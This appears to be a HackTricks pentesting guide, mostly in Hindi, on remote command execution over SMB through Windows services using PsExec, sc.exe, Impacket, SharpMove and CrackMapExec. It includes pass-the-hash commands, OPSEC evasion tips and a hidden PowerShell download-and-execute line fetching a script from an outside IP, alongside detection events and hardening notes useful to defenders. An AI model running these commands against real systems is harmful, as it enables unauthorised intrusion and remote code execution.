# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## ये कैसे काम करते हैं

ये तकनीकें Windows Service Control Manager (SCM) का दुरुपयोग SMB/RPC के माध्यम से दूरस्थ रूप से लक्षित होस्ट पर कमांड निष्पादित करने के लिए करती हैं। सामान्य प्रवाह इस प्रकार है:

1. लक्षित होस्ट पर प्रमाणीकरण करें और SMB (TCP/445) के माध्यम से ADMIN$ शेयर तक पहुँचें।
2. एक निष्पादन योग्य फ़ाइल कॉपी करें या एक LOLBAS कमांड लाइन निर्दिष्ट करें जिसे सेवा चलाएगी।
3. SCM (MS-SCMR over \PIPE\svcctl) के माध्यम से दूरस्थ रूप से एक सेवा बनाएं जो उस कमांड या बाइनरी की ओर इशारा करती है।
4. पेलोड निष्पादित करने के लिए सेवा शुरू करें और वैकल्पिक रूप से stdin/stdout को एक नामित पाइप के माध्यम से कैप्चर करें।
5. सेवा को रोकें और साफ करें (सेवा और किसी भी ड्रॉप की गई बाइनरी को हटाएं)।

आवश्यकताएँ/पूर्व-आवश्यकताएँ:
- लक्षित होस्ट पर स्थानीय व्यवस्थापक (SeCreateServicePrivilege) या लक्षित होस्ट पर स्पष्ट सेवा निर्माण अधिकार।
- SMB (445) पहुँच योग्य और ADMIN$ शेयर उपलब्ध; होस्ट फ़ायरवॉल के माध्यम से दूरस्थ सेवा प्रबंधन की अनुमति।
- UAC दूरस्थ प्रतिबंध: स्थानीय खातों के साथ, टोकन फ़िल्टरिंग नेटवर्क पर व्यवस्थापक को रोक सकती है जब तक कि अंतर्निहित व्यवस्थापक या LocalAccountTokenFilterPolicy=1 का उपयोग न किया जाए।
- Kerberos बनाम NTLM: एक होस्टनाम/FQDN का उपयोग करने से Kerberos सक्षम होता है; IP द्वारा कनेक्ट करने पर अक्सर NTLM पर वापस लौटता है (और सख्त वातावरण में अवरुद्ध हो सकता है)।

### मैनुअल ScExec/WinExec via sc.exe

निम्नलिखित एक न्यूनतम सेवा-निर्माण दृष्टिकोण दिखाता है। सेवा छवि एक ड्रॉप की गई EXE या एक LOLBAS जैसे cmd.exe या powershell.exe हो सकती है।
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notes:
- एक गैर-सेवा EXE शुरू करते समय टाइमआउट त्रुटि की अपेक्षा करें; निष्पादन अभी भी होता है।
- अधिक OPSEC-फ्रेंडली रहने के लिए, फ़ाइल रहित कमांड (cmd /c, powershell -enc) का उपयोग करें या गिराए गए कलाकृतियों को हटा दें।

Find more detailed steps in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Tooling and examples

### Sysinternals PsExec.exe

- क्लासिक प्रशासनिक उपकरण जो SMB का उपयोग करके ADMIN$ में PSEXESVC.exe को ड्रॉप करता है, एक अस्थायी सेवा स्थापित करता है (डिफ़ॉल्ट नाम PSEXESVC), और नामित पाइप के माध्यम से I/O को प्रॉक्सी करता है।
- उदाहरण उपयोग:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- आप WebDAV के माध्यम से Sysinternals Live से सीधे लॉन्च कर सकते हैं:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- सेवा स्थापित/अनइंस्टॉल घटनाओं को छोड़ता है (सेवा का नाम अक्सर PSEXESVC होता है जब तक -r का उपयोग नहीं किया जाता) और निष्पादन के दौरान C:\Windows\PSEXESVC.exe बनाता है।

### Impacket psexec.py (PsExec-जैसा)

- एक अंतर्निहित RemCom-जैसी सेवा का उपयोग करता है। ADMIN$ के माध्यम से एक अस्थायी सेवा बाइनरी (आम तौर पर यादृच्छिक नाम) छोड़ता है, एक सेवा बनाता है (डिफ़ॉल्ट रूप से अक्सर RemComSvc), और एक नामित पाइप के माध्यम से I/O को प्रॉक्सी करता है।
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- अस्थायी EXE C:\Windows\ में (यादृच्छिक 8 अक्षर)। सेवा का नाम डिफ़ॉल्ट रूप से RemComSvc होता है जब तक कि इसे ओवरराइड नहीं किया जाता।

### Impacket smbexec.py (SMBExec)

- एक अस्थायी सेवा बनाता है जो cmd.exe को स्पॉन करता है और I/O के लिए एक नामित पाइप का उपयोग करता है। आमतौर पर एक पूर्ण EXE पेलोड को ड्रॉप करने से बचता है; कमांड निष्पादन अर्ध-इंटरैक्टिव होता है।
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral और SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) कई लेटरल मूवमेंट विधियों को लागू करता है जिसमें सेवा-आधारित exec शामिल है।
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) में एक सेवा को संशोधित/निर्माण करने की क्षमता होती है ताकि दूरस्थ रूप से एक आदेश निष्पादित किया जा सके।
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- आप विभिन्न बैकएंड (psexec/smbexec/wmiexec) के माध्यम से निष्पादित करने के लिए CrackMapExec का भी उपयोग कर सकते हैं:
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detection and artifacts

PsExec-जैसी तकनीकों का उपयोग करते समय सामान्य होस्ट/नेटवर्क आर्टिफैक्ट:
- लक्षित पर सुरक्षा 4624 (लॉगऑन प्रकार 3) और 4672 (विशेष विशेषाधिकार) प्रशासनिक खाते के लिए।
- सुरक्षा 5140/5145 फ़ाइल साझा और फ़ाइल साझा विस्तृत घटनाएँ ADMIN$ पहुँच और सेवा बाइनरी (जैसे, PSEXESVC.exe या यादृच्छिक 8-चर .exe) के निर्माण/लेखन को दिखा रही हैं।
- लक्षित पर सुरक्षा 7045 सेवा स्थापना: सेवा नाम जैसे PSEXESVC, RemComSvc, या कस्टम (-r / -service-name)।
- Sysmon 1 (प्रक्रिया निर्माण) services.exe या सेवा छवि के लिए, 3 (नेटवर्क कनेक्ट), 11 (फ़ाइल निर्माण) C:\Windows\ में, 17/18 (पाइप बनाया/जुड़ा) पाइप के लिए जैसे \\.\pipe\psexesvc, \\.\pipe\remcom_*, या यादृच्छिक समकक्ष।
- Sysinternals EULA के लिए रजिस्ट्री आर्टिफैक्ट: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 ऑपरेटर होस्ट पर (यदि दबाया नहीं गया)।

शिकार विचार
- सेवा स्थापना पर अलर्ट जहाँ ImagePath में cmd.exe /c, powershell.exe, या TEMP स्थान शामिल हैं।
- प्रक्रिया निर्माण की तलाश करें जहाँ ParentImage C:\Windows\PSEXESVC.exe है या LOCAL SYSTEM के रूप में चलने वाले services.exe के बच्चे।
- -stdin/-stdout/-stderr के साथ समाप्त होने वाले नामित पाइप या प्रसिद्ध PsExec क्लोन पाइप नामों को फ्लैग करें।

## Troubleshooting common failures
- सेवाएँ बनाने पर पहुँच अस्वीकृत (5): वास्तव में स्थानीय व्यवस्थापक नहीं, स्थानीय खातों के लिए UAC दूरस्थ प्रतिबंध, या सेवा बाइनरी पथ पर EDR छेड़छाड़ सुरक्षा।
- नेटवर्क पथ नहीं मिला (53) या ADMIN$ से कनेक्ट नहीं कर सका: SMB/RPC को अवरुद्ध करने वाला फ़ायरवॉल या प्रशासनिक साझाएँ अक्षम।
- Kerberos विफल होता है लेकिन NTLM अवरुद्ध है: hostname/FQDN (IP नहीं) का उपयोग करके कनेक्ट करें, उचित SPNs सुनिश्चित करें, या Impacket का उपयोग करते समय टिकटों के साथ -k/-no-pass प्रदान करें।
- सेवा प्रारंभ समय समाप्त हो जाता है लेकिन पेलोड चलता है: यदि वास्तविक सेवा बाइनरी नहीं है तो अपेक्षित; आउटपुट को फ़ाइल में कैप्चर करें या लाइव I/O के लिए smbexec का उपयोग करें।

## Hardening notes
- Windows 11 24H2 और Windows Server 2025 डिफ़ॉल्ट रूप से आउटबाउंड (और Windows 11 इनबाउंड) कनेक्शनों के लिए SMB साइनिंग की आवश्यकता होती है। यह वैध क्रेड्स के साथ वैध PsExec उपयोग को बाधित नहीं करता है लेकिन बिना साइन किए SMB रिले दुरुपयोग को रोकता है और उन उपकरणों पर प्रभाव डाल सकता है जो साइनिंग का समर्थन नहीं करते हैं।
- नए SMB क्लाइंट NTLM अवरुद्ध (Windows 11 24H2/Server 2025) IP द्वारा कनेक्ट करते समय या गैर-Kerberos सर्वरों से कनेक्ट करते समय NTLM फॉलबैक को रोक सकता है। सख्त वातावरण में यह NTLM-आधारित PsExec/SMBExec को तोड़ देगा; Kerberos (hostname/FQDN) का उपयोग करें या यदि वैध रूप से आवश्यक हो तो अपवाद कॉन्फ़िगर करें।
- न्यूनतम विशेषाधिकार का सिद्धांत: स्थानीय व्यवस्थापक सदस्यता को कम करें, Just-in-Time/Just-Enough Admin को प्राथमिकता दें, LAPS को लागू करें, और 7045 सेवा स्थापना पर निगरानी/अलर्ट करें।

## See also

- WMI-आधारित दूरस्थ कार्यान्वयन (अक्सर अधिक फ़ाइल रहित):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-आधारित दूरस्थ कार्यान्वयन:

{{#ref}}
./winrm.md
{{#endref}}



## References

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- SMB सुरक्षा हार्डनिंग Windows Server 2025 & Windows 11 (डिफ़ॉल्ट रूप से साइनिंग, NTLM अवरोधन): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591

{{#include ../../banners/hacktricks-training.md}}
